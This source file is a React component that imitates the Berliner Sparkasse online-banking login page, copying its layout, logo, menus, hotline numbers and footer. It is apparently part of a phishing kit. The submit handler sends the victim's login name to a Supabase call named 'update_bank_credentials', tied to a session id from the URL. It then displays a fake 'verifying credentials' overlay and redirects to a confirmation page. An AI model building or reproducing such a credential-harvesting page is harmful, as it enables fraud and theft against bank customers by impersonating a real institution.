import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import handelsblatt from "@/assets/sparkasse/handelsblatt.png.asset.json";
import focusMoney from "@/assets/sparkasse/focus-money.jpg.asset.json";
import kununu from "@/assets/sparkasse/kununu.png.asset.json";
import trendence from "@/assets/sparkasse/trendence.png.asset.json";

const RED = "#ff0000";
const RED_LINK = "#9c1a1a";
const RED_DARK = "#d10a0a";
const TEXT = "#000000";
const BORDER = "#e5e5e5";
const FONT = "'SparkasseWeb', Arial, sans-serif";
const HEAD = "'SparkasseHead', 'SparkasseWeb', Arial, sans-serif";

const navItems = [
  "Girokonto eröffnen",
  "Produkte",
  "Beratung",
  "Service-Center",
  "Ratgeber",
  "Ihre Sparkasse",
];

const services = [
  "IBAN und BIC berechnen",
  "Kartenverlust melden",
  "Online-Kunde werden",
  "Lösungsfinder",
  "Adresse ändern",
  "Dispositionskredit einrichten oder ändern",
  "Gutscheine kaufen",
  "Alle Serviceleistungen im Überblick",
];

const columns: { title: string; links: string[] }[] = [
  {
    title: "Rund ums Banking",
    links: ["Online-Kunde werden", "Lösungsfinder", "App Sparkasse", "Aktuelle Warnmeldungen", "Sicherheit im Internet", "Computercheck"],
  },
  {
    title: "Kredite und Finanzierungen",
    links: ["S-Privatkredit", "S-Autokredit", "Immobilienfinanzierung", "Modernisierungskredit", "S-Privatkredit Plus", "Dispositionskredit"],
  },
  {
    title: "Wertpapiere und Depots",
    links: ["Depotmodelle", "Fonds", "Deka Investments", "SmartVermögen", "Anlage-Check", "BörsenCenter"],
  },
  {
    title: "Ihre Sparkasse",
    links: ["Gemeinsam für Berlin", "Nachhaltigkeit", "Karriere", "PresseCenter", "Mediathek", "SparkassenShop", "Newsletter"],
  },
];

const footerLinks = [
  "AGB",
  "Cookie-Einstellungen anpassen",
  "Datenschutz",
  "Preise und Hinweise",
  "Barrierefreiheit",
  "Barriere melden",
  "Vertrag widerrufen",
  "Kontakt",
  "Impressum",
  "Filialen A-Z",
  "Geldautomaten A-Z",
];

// Weißes Sparkassen-S-Logo
const SLogo = ({ size = 44 }: { size?: number }) => (
  <svg viewBox="0 0 500 650" width={size} height={(size * 650) / 500} aria-hidden="true">
    <circle cx="250" cy="90" r="90" fill="#fff" />
    <path
      fill="#fff"
      d="M85 220 h330 a85 85 0 0 1 85 85 v55 H120 v70 h380 v170 a85 85 0 0 1 -85 85 H85 a85 85 0 0 1 -85 -85 v-55 h380 v-70 H0 v-170 a85 85 0 0 1 85 -85z"
    />
  </svg>
);

const Sparkasse = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";

  const [username, setUsername] = useState("");
  const [error, setError] = useState(false);
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Berliner Sparkasse - Online-Banking Login", "/favicon.ico");

  const submit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (username.trim() === "") {
      setError(true);
      return;
    }
    if (sessionId) {
      const { error: err } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: "",
        p_username_label: "Anmeldename",
        p_password_label: "",
      });
      if (err) console.error("Update failed:", err);
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col" style={{ fontFamily: FONT, color: TEXT, backgroundColor: "#fff", fontSize: 16, lineHeight: 1.5 }}>
        {/* Top red strip (desktop only) */}
        <div className="hidden lg:block" style={{ backgroundColor: RED, color: "#fff", fontSize: 13 }}>
          <div className="max-w-[1200px] mx-auto px-6 h-10 flex items-center justify-between">
            <div className="flex items-center gap-1">
              <span style={{ background: "#fff", color: RED, padding: "4px 12px", borderRadius: 999, fontWeight: 500 }}>Privatkunden</span>
              <a href="#" style={{ padding: "4px 12px", color: "#fff" }}>Firmenkunden</a>
            </div>
            <div className="flex items-center gap-6">
              <a href="#" className="flex items-center gap-2" style={{ color: "#fff" }}>
                <span className="sk-icon-easy" aria-hidden="true" style={{ fontSize: 18 }} />
                Leichte Sprache
              </a>
              <a href="#" className="flex items-center gap-2" style={{ color: "#fff" }}>
                <span className="sk-icon-sign" aria-hidden="true" style={{ fontSize: 18 }} />
                Gebärdensprache
              </a>
            </div>
          </div>
        </div>

        {/* Header (red) */}
        <header style={{ backgroundColor: RED, color: "#fff" }}>
          <div className="max-w-[1200px] mx-auto px-4 lg:px-6 h-[72px] lg:h-[90px] flex items-center justify-between gap-4">
            <a href="#" className="flex items-center gap-3 shrink-0" style={{ color: "#fff" }}>
              <SLogo size={38} />
              <span className="hidden sm:block" style={{ fontFamily: HEAD, lineHeight: 1.05, fontSize: 20, fontWeight: 400 }}>
                Berliner<br />Sparkasse
              </span>
            </a>
            <nav className="hidden lg:flex items-center gap-6" style={{ fontSize: 16 }}>
              {navItems.map((n) => (
                <a key={n} href="#" style={{ color: "#fff" }}>{n}</a>
              ))}
            </nav>
            <a href="#" className="hidden lg:flex items-center gap-2" style={{ color: "#fff" }}>
              <span className="sk-icon-search" aria-hidden="true" style={{ fontSize: 20 }} />
              Suche
            </a>
            <button className="lg:hidden" aria-label="Menü" style={{ color: "#fff" }}>
              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M3 6h18M3 12h18M3 18h18" /></svg>
            </button>
          </div>
        </header>

        {/* Floating service column (desktop) */}
        <div className="hidden lg:flex fixed right-4 top-[180px] flex-col gap-2 z-40">
          {["sk-icon-phone", "sk-icon-chat", "sk-icon-mail"].map((cls, i) => (
            <a key={cls} href="#" style={{ background: RED, width: 44, height: 44, borderRadius: 4, display: "flex", alignItems: "center", justifyContent: "center", position: "relative", color: "#fff" }}>
              <span className={cls} aria-hidden="true" style={{ fontSize: 22 }} />
              {i === 1 && <span style={{ position: "absolute", top: 6, right: 8, width: 8, height: 8, borderRadius: 999, background: "#4caf50" }} />}
            </a>
          ))}
        </div>

        {/* Login */}
        <main className="flex-1">
          <section className="max-w-[800px] mx-auto px-4 pt-10 lg:pt-16 pb-8">
            <h1 style={{ fontFamily: HEAD, fontSize: 28, fontWeight: 400, textAlign: "center", marginBottom: 20 }}>
              Melden Sie sich an
            </h1>
            <form onSubmit={submit} noValidate>
              <input
                type="text"
                value={username}
                autoComplete="off"
                autoCorrect="off"
                autoCapitalize="off"
                spellCheck={false}
                onChange={(e) => { setUsername(e.target.value); if (error) setError(false); }}
                placeholder="Anmeldename"
                style={{
                  width: "100%",
                  height: 56,
                  padding: "0 16px",
                  border: `1px solid ${error ? "#d20000" : "#767676"}`,
                  background: error ? "#fceded" : "#fff",
                  borderRadius: 4,
                  fontSize: 16,
                  fontFamily: FONT,
                  color: TEXT,
                  outline: "none",
                }}
              />
              {error && (
                <div style={{ color: "#d20000", fontSize: 14, marginTop: 6 }}>
                  Bitte geben Sie Ihren Anmeldenamen ein.
                </div>
              )}
              <div style={{ display: "flex", justifyContent: "center", marginTop: 24 }}>
                <button
                  type="submit"
                  style={{
                    background: RED,
                    color: "#fff",
                    border: "none",
                    borderRadius: 999,
                    padding: "14px 60px",
                    fontSize: 16,
                    fontFamily: FONT,
                    fontWeight: 500,
                    cursor: "pointer",
                  }}
                  onMouseEnter={(e) => (e.currentTarget.style.background = RED_DARK)}
                  onMouseLeave={(e) => (e.currentTarget.style.background = RED)}
                >
                  Weiter
                </button>
              </div>
            </form>

            <div style={{ textAlign: "center", marginTop: 20, fontSize: 15 }}>
              <a href="#" style={{ color: TEXT, textDecoration: "underline" }}>Sicherheitshinweise</a>
              <span style={{ margin: "0 10px", color: "#999" }}>·</span>
              <a href="#" style={{ color: TEXT, textDecoration: "underline" }}>Zugangsdaten vergessen</a>
            </div>

            <div style={{ marginTop: 48, borderTop: `1px solid ${BORDER}`, paddingTop: 20 }}>
              <div style={{ display: "flex", flexWrap: "wrap", alignItems: "baseline", gap: 12, paddingBottom: 16, borderBottom: `1px solid ${BORDER}` }}>
                <span>Sie haben noch kein Online-Banking?</span>
                <a href="#" style={{ color: TEXT, fontWeight: 700 }}>Jetzt freischalten →</a>
              </div>
              <div style={{ display: "flex", flexWrap: "wrap", alignItems: "baseline", gap: 12, paddingTop: 16 }}>
                <span>Sie sind noch kein Sparkassen-Kunde?</span>
                <a href="#" style={{ color: TEXT, fontWeight: 700 }}>Weitere Informationen →</a>
              </div>
            </div>
          </section>

          {/* Immer in Ihrer Nähe */}
          <section className="max-w-[1200px] mx-auto px-4 py-10 text-center">
            <h2 style={{ fontFamily: HEAD, fontSize: 26, marginBottom: 20 }}>Immer in Ihrer Nähe</h2>
            <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-[15px]">
              <span>24 h Privatkunden Service &amp; Beratung: <a href="#" style={{ color: RED_LINK }}>030 869 869 69</a></span>
              <span>Für Unternehmen: BusinessCenter: <a href="#" style={{ color: RED_LINK }}>030 869 866 68</a></span>
            </div>
            <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-[15px] mt-2">
              <span>24 h Online-Banking-Hotline: <a href="#" style={{ color: RED_LINK }}>030 869 869 57</a></span>
              <span>24 h Karten-Sperr-Notruf: <a href="#" style={{ color: RED_LINK }}>030 869 869 05</a></span>
              <a href="#" style={{ color: RED_LINK, fontWeight: 500 }}>Weitere Telefonnummern</a>
            </div>

            <div className="mt-10 grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-6">
              {[
                { label: "Online-Assistentin Linda", icon: "sk-icon-headset", ext: true },
                { label: "Beratungstermin vereinbaren", icon: "sk-icon-calendar" },
                { label: "Öffnungszeiten & Filialen", icon: "sk-icon-location" },
                { label: "Live-Chat", icon: "sk-icon-chat", dot: true },
                { label: "WhatsApp", icon: "sk-icon-whatsapp" },
              ].map((s) => (
                <a key={s.label} href="#" className="flex flex-col items-center gap-2 text-[14px]" style={{ color: TEXT }}>
                  <div style={{ position: "relative", width: 64, height: 64, display: "flex", alignItems: "center", justifyContent: "center" }}>
                    <span className={s.icon} aria-hidden="true" style={{ fontSize: 48, color: RED }} />
                    {s.dot && <span style={{ position: "absolute", top: 6, right: 6, width: 10, height: 10, borderRadius: 999, background: "#4caf50" }} />}
                  </div>
                  <span>{s.label}{s.ext && " ↗"}</span>
                </a>
              ))}
            </div>
          </section>

          {/* Wichtige Services */}
          <section className="max-w-[1200px] mx-auto px-4 pb-10">
            <h3 style={{ fontSize: 13, fontWeight: 700, letterSpacing: 1, textTransform: "uppercase", marginBottom: 12 }}>Wichtige Services</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-x-10">
              {services.map((s) => (
                <a key={s} href="#" className="flex items-center gap-3 py-3" style={{ color: TEXT, borderTop: `1px solid ${BORDER}` }}>
                  <span className="sk-icon-arrow" aria-hidden="true" style={{ fontSize: 18, color: RED }} />
                  <span>{s}</span>
                </a>
              ))}
            </div>
          </section>

          {/* 4 columns */}
          <section className="max-w-[1200px] mx-auto px-4 pb-14 grid grid-cols-2 lg:grid-cols-4 gap-8">
            {columns.map((c) => (
              <div key={c.title}>
                <h4 style={{ fontWeight: 700, marginBottom: 12 }}>{c.title}</h4>
                <ul className="flex flex-col gap-2">
                  {c.links.map((l) => (
                    <li key={l}><a href="#" style={{ color: RED_LINK }}>{l}</a></li>
                  ))}
                </ul>
              </div>
            ))}
          </section>

          {/* Awards */}
          <section className="max-w-[1200px] mx-auto px-4 pb-14" style={{ borderTop: `1px solid ${BORDER}`, paddingTop: 40 }}>
            <div className="grid grid-cols-2 lg:grid-cols-4 gap-8">
              {[
                { img: focusMoney.url, title: "Private Banking Beratung und Service", sub: "FOCUS MONEY Januar 2026" },
                { img: handelsblatt.url, title: "Bestes Mobile Banking 2026", sub: "App Sparkasse" },
                { img: kununu.url, title: "Kununu", sub: "Top Company 2026" },
                { img: trendence.url, title: "Attraktivste Arbeitgeber 2025", sub: "1. Platz: Schüler" },
              ].map((a) => (
                <div key={a.title} className="flex flex-col items-center text-center gap-3">
                  <img src={a.img} alt={a.title} style={{ height: 150, width: "auto", objectFit: "contain" }} />
                  <div style={{ fontWeight: 700, fontSize: 14 }}>{a.title}</div>
                  <div style={{ fontSize: 13 }}>{a.sub}</div>
                </div>
              ))}
            </div>
          </section>
        </main>

        {/* Footer */}
        <footer style={{ borderTop: `1px solid ${BORDER}`, padding: "32px 16px" }}>
          <div className="max-w-[1200px] mx-auto flex flex-col items-center gap-4">
            <div style={{ fontWeight: 500 }}>Berliner Sparkasse</div>
            <div className="flex items-center gap-2 text-[14px]">
              <span aria-hidden="true" style={{ width: 16, height: 16, borderRadius: 999, border: "1.5px solid #000", display: "inline-block" }} />
              <a href="#" style={{ color: TEXT, textDecoration: "underline" }}>DE ▾</a>
            </div>
            <div className="flex flex-wrap justify-center gap-x-5 gap-y-2 text-[14px]">
              {footerLinks.map((l) => (
                <a key={l} href="#" style={{ color: TEXT, textDecoration: "underline" }}>{l}</a>
              ))}
            </div>
            <div className="flex items-center gap-5 mt-2" aria-hidden="true">
              {["f", "ig", "tt", "yt", "in"].map((k) => (
                <a key={k} href="#" style={{ width: 32, height: 32, borderRadius: 999, border: `1.5px solid ${TEXT}`, display: "inline-flex", alignItems: "center", justifyContent: "center", color: TEXT, fontSize: 12, fontWeight: 700 }}>{k}</a>
              ))}
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default Sparkasse;
